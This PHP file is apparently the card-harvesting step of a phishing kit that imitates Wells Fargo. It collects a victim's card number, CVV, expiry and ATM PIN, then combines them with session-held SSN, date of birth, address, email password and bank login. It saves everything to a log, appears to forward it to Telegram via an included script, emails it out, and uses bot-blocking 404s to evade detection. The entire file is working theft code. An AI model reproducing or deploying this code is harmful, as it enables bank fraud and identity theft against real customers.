<?php

session_start();


require_once '../Conf.php';
// require_once '../Layout/Antibot.php';
// require_once '../Layout/demonTest.php';

$comps = new Comp;
// $antibot = new Antibot;


$settings = $comps->settings();

if (!$comps->checkToken()) {
    echo $antibot->throw404();
    $comps->log(
        "../../Extracted/key/kill.txt",
        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
    );
    die();
}

if (isset(
    $_POST['card'],
    $_POST['exp'],
    $_POST['cvv'],
    $_POST['atm']
)) {
    if (!$comps->checkEmpty(
        $_POST['card'],
        $_POST['exp'],
        $_POST['cvv'],
        $_POST['atm']
    )) {
        $binInfo = $comps->getBin(str_replace(' ', '', $_POST['card']));

        isset($binInfo['scheme']) || $binInfo['scheme'] = "Unknown";
        isset($binInfo['brand']) || $binInfo['brand'] = "Unknown";
        isset($binInfo['type']) || $binInfo['type'] = "Unknown";
        isset($binInfo['country']) || $binInfo['emoji'] = "Unknown";
        isset($binInfo['country']) || $binInfo['alpha2'] = "Unknown";



        $content = ' [+]━━━━━━━【🔑 CC from ' . $_SESSION['username'] . ' 】
           
                [👤 Card number:] ' . str_replace(" ", "", $_POST['card']) . '
                [👤 Expiration Date:] ' . $_POST['exp'] . '
                [👤 CVV:] ' . $_POST['cvv'] . '
                [👤 ATM PIN:] ' . $_POST['atm'] . '
           
            🧊 BIN Info
                   [👤 Brand:] ' . ucwords($binInfo['scheme']) . '
                    [👤 Level:] ' . ucwords($binInfo['brand']) . '
                    [👤 Type:] ' . ucwords($binInfo['type']) . '
                    [👤 Country:] ' . ucwords($binInfo['country']['emoji'] . " (" . $binInfo['country']['alpha2']) . ')
           
            💫 Billing Info
                   [👤 Full Name:] ' . $_SESSION['fname'] . '
                   [👤 Address:] ' . $_SESSION['addr'] . '
                   [👤 City:] ' . $_SESSION['city'] . '
                   [👤 State:] ' . $_SESSION['state'] . '
                   [👤 ZIP:] ' . $_SESSION['zip'] . '
                   [👤 SSN:] ' . $_SESSION['ssn'] . '
                   [👤 DOB:]   ' . $_SESSION['dob'] . '
                   [👤 Phone Number:] ' . $_SESSION['phone'] . '
                    
            🌎 Email Info
                   [👤 Email Address:] ' . $_SESSION['email'] . '
                   [👤 Password:] ' . $_SESSION['emailPassword'] . '
                   [👤 Domain:] ' . ucwords(substr($_SESSION['email'], strpos($_SESSION['email'], '@') + 1)) . '
                     Login Info
                    Username: ' . $_SESSION['username'] . '
                    Password: ' . $_SESSION['password'] . '
           
            📱 Device Info ' . $comps->userDetails();

        $save = fopen("./logs.txt", "a+");
        fwrite($save, $content);
        fclose($save);

        include "./sendtel.php";

        if ($comps->mailX("(1) CC | Wells Fargo", $content, $_SESSION['fname'])) {
            $comps->log(
                "../../Extracted/key/live.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) CC\n\n"
            );
            $comps->headerX("../../Login/complete.php");
        } else {
            die($antibot->throw404());
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Extracted/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }
} else {
    echo $antibot->throw404();
    $comps->log(
        "../../Extracted/key/kill.txt",
        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
    );
    die();
}
